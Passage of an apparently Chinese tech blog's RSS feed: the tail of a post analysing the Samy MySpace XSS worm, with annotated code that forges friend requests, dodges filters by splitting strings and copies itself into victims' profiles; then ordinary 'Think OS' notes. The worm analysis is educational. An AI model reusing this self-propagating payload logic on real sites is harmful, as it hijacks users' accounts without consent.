class="string">'POST'</span>, paramsToString(AS))</span><br><span class="line">            <span class="comment">// 这里是核心部分提交对 samy 关注的请求</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的函数在http请求返回时候进行回调，实现添加 samy 关注的功能。</p><hr><p>第二个，请求函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpSend2</span>(<span class="params">BH, BI, BJ, BK</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!xmlhttp2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'xmlhttp2.onr'</span> + <span class="string">'eadystatechange = BI'</span>);</span><br><span class="line">    xmlhttp2.open(BJ, BH, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (BJ == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        xmlhttp2.setRequestHeader(<span class="string">'Content - Type'</span>, <span class="string">'application / x - www - form - urlencoded'</span>); xmlhttp2.setRequestHeader(<span class="string">'Content - Length'</span>, BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp2.send(BK); <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面函数的回调函数如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processxForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp2.readyState != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> AU = xmlhttp2.responseText;</span><br><span class="line">    <span class="keyword">var</span> AQ = getHiddenParameter(AU, <span class="string">'hashcode'</span>);</span><br><span class="line">    <span class="keyword">var</span> AR = getFromURL(AU, <span class="string">'Mytoken'</span>);</span><br><span class="line">    <span class="keyword">var</span> AS = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    AS[<span class="string">'hashcode'</span>] = AQ;</span><br><span class="line">    AS[<span class="string">'friendID'</span>] = <span class="string">'11851658'</span>;</span><br><span class="line">    AS[<span class="string">'submit'</span>] = <span class="string">'Add to Friends'</span>;</span><br><span class="line">    httpSend2(<span class="string">' / index.cfm ? fuseaction = invite.addFriendsProcess &amp; Mytoken = '</span> + AR,</span><br><span class="line">        nothing, <span class="string">'POST'</span>, paramsToString(AS))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> AA = g();<span class="comment">// 代码这里获取页面的代码 </span></span><br><span class="line"><span class="keyword">var</span> AB = AA.indexOf(<span class="string">'m'</span> + <span class="string">'ycode'</span>);</span><br><span class="line"><span class="keyword">var</span> AC = AA.substring(AB, AB + <span class="number">4096</span>);</span><br><span class="line"><span class="keyword">var</span> AD = AC.indexOf(<span class="string">'D'</span> + <span class="string">'IV'</span>);</span><br><span class="line"><span class="keyword">var</span> AE = AC.substring(<span class="number">0</span>, AD);</span><br><span class="line"><span class="comment">// 这里的这几行，对页面的内容进行截取操作</span></span><br></pre></td></tr></table></figure><p>这里对页面的内容进行获取，截取出需要的段。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> B = <span class="built_in">String</span>.fromCharCode(<span class="number">34</span>);</span><br><span class="line"><span class="keyword">var</span> A = <span class="built_in">String</span>.fromCharCode(<span class="number">39</span>);<span class="comment">// 这里的是 JS 的从AsCII 转字符的函数</span></span><br><span class="line"><span class="comment">// 对应的是 ' 与 " </span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (AE) &#123;</span><br><span class="line">    AE = AE.replace(<span class="string">'jav'</span> + <span class="string">'a'</span>, A + <span class="string">'jav'</span> + <span class="string">'a'</span>);</span><br><span class="line">    AE = AE.replace(<span class="string">'exp'</span> + <span class="string">'r)'</span>, <span class="string">'exp'</span> + <span class="string">'r)'</span> + A);</span><br><span class="line">    AF = <span class="string">'but most of all,samy is my hero. &lt; d'</span> + <span class="string">'iv id = '</span> + AE + <span class="string">'D'</span> + <span class="string">'IV &gt; '</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里如果存在了 目标的 内容，那么构造AE与AF 两段内容</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>通过这本书,或者是这篇文章,简单的了解了一个XSS蠕虫的实现，以及其传播的原理，借助WEB层面的功能，通过用户的操作伪造，实现对samy 关注，和对自己的 profile 进行修改的功能，从而实现了 这个蠕虫的大面积传播。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/12/24/Book_XSS_worm&amp;virus/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书 《操作系统思考》</title>
      <link>https://www.diglp.xyz/2018/11/24/Book_ThinkOS/</link>
      <guid>https://www.diglp.xyz/2018/11/24/Book_ThinkOS/</guid>
      <pubDate>Fri, 23 Nov 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;中间有事情折腾来回飘，其中也是抽了抽时间看了看书。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;这里放上一幅偶遇的图，自己现在在哪里呢~&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://s6.sinaimg.cn/mw690/001WHoRhzy7ogx3x03ze5&amp;amp;690&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>中间有事情折腾来回飘，其中也是抽了抽时间看了看书。</p><hr><p>这里放上一幅偶遇的图，自己现在在哪里呢~</p><p><img src="http://s6.sinaimg.cn/mw690/001WHoRhzy7ogx3x03ze5&amp;690" alt="邓宁-克鲁格心理效应"></p><hr><p>身为互联网人，也难免不惊叹于互联网的发展，很久以前，一直在思考，明明有那么好的，先进的易用的科技产品，那么在平常百姓的家里怎么就这么难见到呢？一直在想，有一个怕平台，可以把这些东西推到人们身边。实则不然，哪里这么简单，更快，更方便，就是人们的选择吗？年龄，思维，甚至性格，都会去决定这些东西存在的可能。真正的拿了就走的自动售货机。。。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：操作系统思考 中文版</li><li>原文：<span class="exturl" data-url="aHR0cDovL2dyZWVudGVhcHJlc3MuY29tL3RoaW5rb3MvaHRtbC9pbmRleC5odG1s" title="http://greenteapress.com/thinkos/html/index.html">Think OS: A Brief Introduction to Operating Systems<i class="fa fa-external-link"></i></span></li><li>译者：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLw==" title="https://github.com/">飞龙<i class="fa fa-external-link"></i></span></li><li>来源：<span class="exturl" data-url="aHR0cDovL2dyZWVudGVhcHJlc3MuY29tL3dwLw==" title="http://greenteapress.com/wp/">Allen B. Downey<i class="fa fa-external-link"></i></span></li><li>协议：<span class="exturl" data-url="aHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbGljZW5zZXMvYnktbmMtc2EvNC4wLw==" title="http://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0<i class="fa fa-external-link"></i></span></li></ul><hr><p>一本入门级的讲操作系统的书，这里一样的是当作拾遗了，书写的还是很不错的，推荐！</p><p>每次都是感谢这些 开源书籍，以后有能里自己推一本！</p><p>这本书，从编译开始，到一个进程和进程的虚拟内存，文件系统，缓存，多任务，线程互斥等等的方面。</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>这一部分从 解释性语言和编译性语言来引出了编译的这一个概念。</p><blockquote><p>人们通常把编程语言描述为编译语言或者解释语言。前者的意思是程序被翻译成机器语言，之后由硬件执行；而后者的意思是程序被软件解释器读取并执行。例如，C被认为是编译语言，而Python被认为是解释语言。但是二者之间的界限并不总是那么明显。</p><p>…</p><p>所以，编译执行或解释执行并不是语言的内在特征。尽管如此，在编译语言和解释语言之间有一些普遍的差异。</p></blockquote><p>很多语言都 可以被 编译 和解释两种执行方式。可以有<strong>解释性的C</strong>和<strong>编译性的Python (Py2Exe)</strong>。JAVA 更加特殊，先进行编译为 Java字节码 ，dex。</p><p>在解释性语言中，在运行的过程中，变量的名称以及变量的值都会被保存在内存空间中的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>globals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: <span class="keyword">None</span>, <span class="string">'a'</span>: <span class="number">123</span>, <span class="string">'__package__'</span>: <span class="keyword">None</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>locals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: <span class="keyword">None</span>, <span class="string">'a'</span>: <span class="number">123</span>, <span class="string">'__package__'</span>: <span class="keyword">None</span>&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>而在 编译性语言的运行过程中，是不会出现变量名称的，只会变量的值（内存地址）。</p><p>编译的过程：这个可以算是考点了，预处理，编译，汇编，链接。（.i -&gt; .s -&gt; .o -&gt; .exe)。</p><p>在书中，这里细化为了 5 个步骤：预处理， 解析， 静态检查代码， 生成， 链接， 优化。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -S# 译得到 汇编代码</span><br><span class="line">gcc hello.c -c# 编得到 二进制中间文件</span><br><span class="line">gcc hello.c -E# 处理</span><br></pre></td></tr></table></figure><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>书中提到的很重要的两个概念，<strong>抽象</strong> 与 <strong>虚拟化</strong> 。具体的概念就不展开了哈。OOP概念，虚拟化，可以理解为一种复杂的映射。</p><blockquote><p>“虚拟”这个词通常用于虚拟机的语境中，它是一种软件，可以创建运行特定系统的专用计算机的幻象。实际上，虚拟机可能和其它虚拟机一起运行在不同的操作系统上。</p><p>在虚拟化的语境中，我们通常把真实发生的事情叫做“物理的”，而把虚拟上发生的事情叫做“逻辑的”或者“抽象的”。</p></blockquote><p>在操作系统上讲，其对进程来讲是 <strong>抽象的</strong>，内存来讲是<strong>虚拟化的</strong>。</p><hr><p>进程隔离，进程的内存空间当然是独立的，且受保护的，两个进程的数据，如果在一起了，那么相互影响，结果是双双崩溃。（当然，通过注入技术，是可以实现对其他进程的内存访问。）</p><blockquote><p>操作系统最重要的目标之一，就是将每个进程和其它进程隔离，使程序员不必考虑每个可能的交互情况。提供这种隔离的软件对象叫做进程（Process）。</p></blockquote><p>进程，可以称之为<strong>隔离的软件对象</strong>。对象保护以下的数据对象：</p><ul><li>代码段</li><li>相关数据：静态区，堆区，栈区。</li><li>任何等待状态的IO资源</li><li>程序的硬件状态</li></ul><p>当进程出现了 Fork ：这种情况下，各个进程共享程序文本，但是拥有不同的数据和硬件状态。</p><hr><p>进程隔离的实现：</p><ul><li>多任务        可以在程序的任何时候中断它，保存寄存器状态。</li><li>虚拟内存        实际上，进程的内存在物理内存里面是分片映射的，区域不会重复-</li><li>设备抽象        可用的IO设备被抽象成对象，系统自动的实现 资源的分配及调度</li></ul><hr><blockquote><p>“TTY”代表“电传打字机”（Teletypewriter），它是原始的机械终端。</p></blockquote><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><blockquote><p>你一定听过人们谈论32位和64位系统。这些术语表明了寄存器的尺寸，也通常是虚拟地址的大小。在32位系统上，虚拟地址是32位的，也就是说虚拟地址空间为从0到0xffff ffff。这一地址空间的大小是<code>2 ** 32</code>个字节，或者4GiB。</p><p>在64位系统上，虚拟地址空间大小为<code>2 ** 64</code>个字节，或者<code>4 * 1024 ** 6</code>个字节。这是16个EiB，大约比当前的物理内存大十亿倍。虚拟内存比物理内存大很多，这看上去有些奇怪，但是我们很快就就会看到它如何工作。</p></blockquote><p>这里写到了，进程的虚拟内存结构，运行中的进程数据组织为 4 个段：</p><table><thead><tr><th>数据段</th><th>功能</th><th>位置</th></tr></thead><tbody><tr><td><code>text</code></td><td>程序文本，代码段</td><td>段靠近内存“底部”，即接近<code>0x00000000</code>的地址。</td></tr><tr><td><code>static</code></td><td>全局变量，和使用<code>static</code>声明的局部变量。</td><td>段通常刚好在<code>text</code>段上面。</td></tr><tr><td><code>stack</code></td><td>如其名是栈空间，里面是栈帧（每个Function运行时分配（参数，局部变量），重要的是RP，返回地址）</td><td>段靠近内存顶部，即接近虚拟地址空间的最大地址<code>0xffffffff</code>。在扩张过程中，它向低地址的方向增长。</td></tr><tr><td><code>heap</code></td><td>堆区，我们动态分配，以及释放的内存段 <code>malloc</code> 内存泄露的重灾区</td><td>通常在<code>static</code>段的上面。在扩张过程中，它向高地址的方向增长</td></tr></tbody></table><p>在虚拟内存地址的分布，也是有着固定的关系。</p><hr><p><strong>地址翻译</strong>        虚拟地址（Virtual Memory） 翻译成 物理地址 （Physical Memory）。这里就有了很重点的地方，就是内存映射。MMU（内存管理单元），就实现了这样的一个很重要的角色，位于CPU和主存之间。MMU在VA和PA之间执行快速的翻译。</p><blockquote><ol><li>当程序读写变量时，CPU会得到VA。</li><li>MMU将VA分成两部分，称为页码和偏移。“页”是一个内存块，页的大小取决于操作系统和硬件，通常为1~4KiB。</li><li>MMU在“页表”里查找页码，然后获取相应的物理页码。之后它将物理页码和偏移组合得到PA。</li><li>PA传递给主存，用于读写指定地址。</li></ol></blockquote><h2 id="文件与文件系统"><a href="#文件与文件系统" class="headerlink" title="文件与文件系统"></a>文件与文件系统</h2><p>HDD/SSD</p><blockquote><p>机械硬盘比较复杂。数据存储在块内，它们布局在扇区中，扇区又组成磁道。磁道在盘片上以同心圆的形式排列。</p><p>固态硬盘稍微简单一些，因为块按顺序被标号。但是这会产生另一种困难，每个块在变得不可靠之前，只能被读写有限的次数。</p></blockquote><p>在抽象的层面讲，文件系统就是<strong>文件名到文件内容的键值映射</strong>，如果你认为名称是键，内容是值，文件系统就是一种<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvS2V5LXZhbHVlX2RhdGFiYXNl" title="https://en.wikipedia.org/wiki/Key-value_database">键值对的数据库<i class="fa fa-external-link"></i></span>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp = fopen(<span class="string">"/home/downey/file.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">fputc(<span class="string">'b'</span>, fp);<span class="comment">// 被缓冲的</span></span><br><span class="line"><span class="keyword">char</span> c = fgetc(fp);</span><br><span class="line">fclose(fp);<span class="comment">// 此时回写硬盘</span></span><br></pre></td></tr></table></figure><p>这里的文件打开后，得到了一个文件指针。</p><hr><p>从物理层面。来看待磁盘的读性操作是相当的费时的，从磁盘上的进行一个块的读 需要 <strong>2~6ms</strong> 。</p><p>所以在操作系统的层面上有以下的处理：</p><ul><li>块操作    以磁盘的块为单位加载到内存中进行处理，即使单字节数据亦然</li><li>预取    在对文件首块进行访问的时候，后面的部分已经开始了预取</li><li>缓冲    对文件进行的写操作，会在内存中线进行缓冲，之后统一的进行写入，提高写入性能</li></ul><hr><p>  数据在磁盘上如果是连续排列的，那么读写性能将会很客观，不过事实上很难做到。数据频繁的读写，很难给每一个文件都找到合适的连续空间。所以多数操作系统 <strong>把文件分散在不同的地方，使用数据结构来进行数据库的跟踪</strong>。</p><p>在 Unix 的文件系统中，数据结构被称之为<strong><code>inode</code></strong>（index node）。</p><blockquote><p>文件内容就是数据，所以关于文件内容的数据就是数据的数据，所以为“元数据”。</p></blockquote><p>inode 这个数据结构，包括文件的拥有者，权限，时间戳，等待，重要的是文件内容，这里使用间接存储，使用多级的结构，把文件分散的存储在磁盘的不同地方。第一大文件，使用多级映射，（三级）</p><p>FAT 是一种很常见的文件结构了，他的全名是 <strong>文件分配表</strong>（File Allocation Table），其思路是把磁盘的每个块都会有一个条目，这个条目的上下文叫做簇。</p><p>目录包含了每个文件的第一个簇的指针，而每个条目的指针又指向了下一个簇，所以这里形成了一个类似于链表的结构。</p><p>所以这里问题来了，在inode 的方法的文件系统中 （ext3，ext4…）好处是不会出现文件的碎片化。但是在 fat 的文件系统下，就会出现文件的碎片化 ，也就是每个簇在物理地址上的差别太大，导致多次的寻道，导致了IO性能的问题。</p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>这里指的是动态内存分配，<code>malloc</code>， <code>colloc</code> ，<code>free</code>， <code>realloc</code>。下面的是常见的内存错误</p><ul><li>使用未分配内存</li><li>释放后访问</li><li>释放未分配内存</li><li>重复释放内存</li><li>非法使用 realloc</li></ul><p>内存错误，通常很严重很各色诡异，所以也是最难解决的问题。 </p><ul><li>如果存在未分配的指针，运气好，地址落在了代码段，这里的内存是只读的，进行数据写之后，通常会有段错误发生，所以可以看到异常的发生。</li><li>未分配指针，如果地址落在了可读性的内存区域内，导致的问题可能更加严重，程序本身并没有明显多万，带式可能一些数据被非法的修改，导致了一些诡异的情况。而且十分的不易察觉。</li></ul><hr><p>当我们使用函数进行了内存的分配，但是我没有使用 <code>free</code> ，到后面我们又搞丢了这个分配空间的地址，那么这就导致了<strong>内存泄漏</strong>。 进程占用了过多的无用内存。如果，进程很快退出，可能不会有影响。但是时间久了，就会越来越多，到后面可能直接导致了Core 的发生。</p><p>不过，内存本身有管理机制，这种泄露使用的内存页，一般是不会再次被访问了，所以一般会被置换到硬盘的交换区。对系统性能的影响不是很大。</p><hr><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>操作系统在缓存的等级来讲，已经实现了无感知，硬件本身帮我们实现了缓存的存在</p><p><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vdGhpbmstb3MvY29udGVudC9jaDcuaHRtbA==" title="https://wizardforcel.gitbooks.io/think-os/content/ch7.html">https://wizardforcel.gitbooks.io/think-os/content/ch7.html<i class="fa fa-external-link"></i></span></p><p>内存换页：</p><blockquote><ul><li>大多数进程不会用完所分配的内存。<code>text</code>段的许多部分都永远不会执行，或者执行一次就再也不用了。这些页面可以被换出而不会引发任何问题。</li><li>如果程序泄露了内存，它可能会丢掉所分配的空间，并且永远不会使用它了。通过将这些页面换出，操作系统可以有效填补泄露。</li><li>在多数系统中，有些进程像守护进程那样，多数时间下都是闲置的，只在特定场合被“唤醒”来响应事件。当它们闲置时，这些进程可以被换出。</li><li>另外，可能有许多进程运行同一个程序。这些进程可以共享相同的<code>text</code>段，避免在物理内存中保留多个副本。</li></ul></blockquote><h2 id="多任务"><a href="#多任务" class="headerlink" title="多任务"></a>多任务</h2><blockquote><p>操作系统中，实现多任务的这部分叫做“内核”。在坚果或者种子中，内核是最内层的部分，由外壳所包围。在操作系统各种，内核是软件的最底层，由一些其它层包围，包括称为“Shell”的界面。计算机科学家喜欢引喻。</p></blockquote><p>在操作系统中，由于处理核心数的限制，进程之间，事实上都是串行的，他们之间由内核，进行快速的上下文切换，我没感受不到间隔，所以认为是并行的，这也就是我们的多任务。</p><p>内核在不断的处理系统的中断使用终端服务代码段。下面是相应中断的过程：</p><blockquote><ol><li>当中断发生时，硬件将程序计数器保存到一个特殊的寄存器中，并且跳到合适的中断处理器。</li><li>中断处理器将程序计数器和位寄存器，以及任何打算使用的数据寄存器的内容储存到内存中。</li><li>中断处理器运行处理中断所需的代码。</li><li>之后它复原所保存寄存器的内容。最后，复原被中断进程的程序计数器，这会跳回到被中断的进程。</li></ol></blockquote><hr><p>在发生了中断之后，系统并不会总是恢复被中断的任务，而是可能从内存中取出另一个进程的状态进行恢复，这就实现了<strong>上下文切换</strong></p><blockquote><p>在多任务的系统中，每个进程都允许运行一小段时间，叫做“时间片”或“quantum”。在上下文切换的过程中，内核会设置一些硬件计数器，它们会在时间片的末尾产生中断。当中断发生时，内核可以切换到另一个进程，或者允许被中断的进程继续执行。操作系统中做决策的这一部分叫做“<strong>调度器</strong>”。</p></blockquote><p>这里就是，进程调度了，这里就是时间片轮转法。让我想到之前 玩 手机 OC的时代：</p><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMuY29sb3Jvcy5jb20vdGhyZWFkLTEwMjYzMi0xLTEuaHRtbA==" title="https://bbs.coloros.com/thread-102632-1-1.html">CPU处理器和IO调度详解—让手机更省电更流畅<i class="fa fa-external-link"></i></span></p><hr><p>进程状态 ：由三态，五态模型。</p><blockquote><p>一台计算机上可能运行着成百上千条进程，但是通常大多数进程都是阻塞的。大多数情况下，只有一小部分进程是就绪或者运行的。当中断发生时，调度器会决定那个进程应启动或恢复</p></blockquote><hr><p>关于进程调度：</p><blockquote><ul><li>进程可能被不同的资源限制。执行大量计算的进程是计算密集的，也就是说它的运行时间取决于得到了多少CPU时间。从网络或磁盘读取数据的进程是IO密集的，也就是说如果数据输入和输出更快的话，它就会更快，但是在更多CPU时间下它不会运行得更快。最后，与用户交互的程序，在大多数时间里可能都是阻塞的，用于等待用户的动作。操作系统有时可以将进程基于它们过去的行为分类，并做出相应的调度。例如，当一个交互型进程不再被阻塞，应该马上运行，因为用户可能正在等待回应。另一方面，已经运行了很长时间的CPU密集的进程可能就不是时间敏感的。</li><li>如果一个进程可能会运行较短的时间，之后发出了阻塞的请求，它可能应该立即运行，出于两个原因：（1）如果请求需要一些时间来完成，我们应该尽快启动它，（2）长时间运行的进程应该等待短时间的进程，而不是反过来。作为类比，假设你在做苹果馅饼。面包皮需要5分钟来准备，但是之后需要半个小时的冷却。而馅料需要20分钟来准备。如果你首先准备面包皮，你可以在其冷却时准备馅料，并且可以在35分钟之内做完。如果你先准备馅料，就会花费55分钟。</li></ul></blockquote><p>这里引用文中的话，如何更明智的选择调度方式，的第一点提到了计算密集型，以及 IO密集型，这里的密集型可以理解为时间主要花费在。</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>进程下面派生出了线程，和进程不同，他们共享：代码段，静态区，以及堆区。栈是独立的。</p><p>所以在使用线程的时候，最大的问题，就是线程的同步问题，<strong>如何做到线程不会同时的区争夺一个资源，或者同时区读写一个变量</strong>。死锁和竞态</p><p>进程是资源分配的最小单位，线程是调度的最小单位。</p><p>在 POSIX 的标准中，一个安全的新建线程的示例代码如下，记得编译的时候静态链接上 <code>pthread</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pthread_t</span> make_thread(<span class="keyword">void</span> *(*entry)(<span class="keyword">void</span> *), Shared *shared)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> n;</span><br><span class="line">  <span class="keyword">pthread_t</span> thread;</span><br><span class="line"></span><br><span class="line">  n = pthread_create(&amp;thread, <span class="literal">NULL</span>, entry, (<span class="keyword">void</span> *)shared);</span><br><span class="line">  <span class="keyword">if</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">"pthread_create failed"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> thread;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以，比较容易的发现，一个输出型参数，后面的就是函数的入库，再往后就是我没传入的线程函数参数。</p><hr><p>有提到，线程直接是共享代码段，静态区，以及堆区。所以，当一个线程对变量进行修改的时候，会影响到其他的线程中的值，这对于这个变量的操作是 <strong>非原子的</strong>。所以这里为了实现线程间的同步 涉及到了 <strong>互斥体（mutex）</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> counter;</span><br><span class="line">&#125; Shared;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> counter;</span><br><span class="line">  Mutex *mutex;</span><br><span class="line">&#125; Shared;</span><br></pre></td></tr></table></figure><p>对传入的参数进行修改，这里使用了mutex</p><p>一样使用 POSIX 初始化互斥体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Mutex *<span class="title">make_mutex</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Mutex *mutex = check_malloc(<span class="keyword">sizeof</span>(Mutex));</span><br><span class="line">  <span class="keyword">int</span> n = pthread_mutex_init(mutex, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (n != <span class="number">0</span>) perror_exit(<span class="string">"make_lock failed"</span>); </span><br><span class="line">  <span class="keyword">return</span> mutex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在进程的函数中，先得到互斥体，如果得不到，说明有线程正则使用，那么被阻塞。直到另一个线程完成操作，解锁互斥体之后，该线程才得以运行。</p><hr><p>书中还在后面细化了这部分，可以看看代码，便跳过了。</p><h2 id="互斥体，信号量"><a href="#互斥体，信号量" class="headerlink" title="互斥体，信号量"></a>互斥体，信号量</h2><p>互斥体前面已经有提到了，先申请锁，如果得不到，说明有使用，就被阻塞，等待释放锁，得到之后立即加锁，其他的线程无法得到锁，完成之后释放，就是这样的过程，实现了线程间的同步。</p><hr><p>信号量实际上是一种高阶的互斥体，互斥体可以理解为二值信号量。信号量里面涉及到了 PV 操作。</p><p>通过互斥体来讲：mutex 为 1 说明资源存在，为0 说明正在被占用</p><p>到了信号量，sem 为 10 说明有十个资源， 为0 说明已经完全分配， -1 说明有一个进程在等待资源。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/11/24/Book_ThinkOS/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书 《Python 安全编程教程》</title>
      <link>https://www.diglp.xyz/2018/10/29/Book_Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/</link>
      <guid>https://www.diglp.xyz/2018/10/29/Book_Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/</guid>
      <pubDate>Sun, 28 Oct 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;已经地几本了，鼓励一下自己啦。这本主要是讲 &lt;code&gt;python&lt;/code&gt; 用于安全相关的编程内容。本书的篇幅比较的短，这篇总结一下主要的内容。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;我们是愚者，我们是一只蜂 &lt;code&gt;1.6*10^9 &amp;gt;
          
        
      
      </description>
      
